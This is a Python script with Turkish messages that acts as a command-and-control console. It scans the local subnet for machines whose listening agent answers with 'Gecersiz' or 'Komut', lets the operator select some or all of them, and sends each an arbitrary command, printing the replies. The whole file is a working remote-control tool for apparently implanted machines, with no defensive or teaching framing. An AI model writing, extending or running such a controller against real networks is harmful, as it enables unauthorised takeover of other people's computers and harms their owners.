
import socket
import sys
import subprocess

def get_local_ips():
    try:
        out = subprocess.check_output("ip addr show", shell=True).decode()
        for line in out.splitlines():
            if "inet " in line and "127.0.0.1" not in line:
                return line.split()[1].split("/")[0]
    except:
        return "192.168.1.1"

def tarama_yap(gateway, port):
    ip_base = ".".join(gateway.split(".")[:3])
    aktif = []
    print("[*] Ağ taranıyor...")
    for i in range(1, 255):
        hedef_ip = f"{ip_base}.{i}"
        try:
            s = socket.socket()
            s.settimeout(0.2)
            s.connect((hedef_ip, port))
            s.send(b"ping")
            cevap = s.recv(1024).decode()
            if "Gecersiz" in cevap or "Komut" in cevap:
                print(f"[✓] Aktif: {hedef_ip}")
                aktif.append(hedef_ip)
            s.close()
        except:
            continue
    return aktif

def komut_gonder(ip, port, komut):
    try:
        s = socket.socket()
        s.connect((ip, port))
        s.send(komut.encode())
        cevap = s.recv(4096).decode()
        print(f"[{ip}] => {cevap.strip()}")
        s.close()
    except Exception as e:
        print(f"[{ip}] HATA: {e}")

if __name__ == "__main__":
    if len(sys.argv) != 3 or sys.argv[1] != "-p":
        print("Kullanım: python server.py -p <port>")
        sys.exit()

    port = int(sys.argv[2])
    modem_ip = get_local_ips()
    aktifler = tarama_yap(modem_ip, port)

    if not aktifler:
        print("[!] Aktif cihaz bulunamadı.")
        sys.exit()

    print("\n[*] Hedefleri Seç:")
    for i, ip in enumerate(aktifler):
        print(f"[{i+1}] {ip}")
    secim = input("Seç (virgülle veya *): ")
    if secim.strip() == "*":
        hedefler = aktifler
    else:
        hedefler = [aktifler[int(i)-1] for i in secim.strip().split(",")]

    komut = input("Komut: ")
    for ip in hedefler:
        komut_gonder(ip, port, komut)
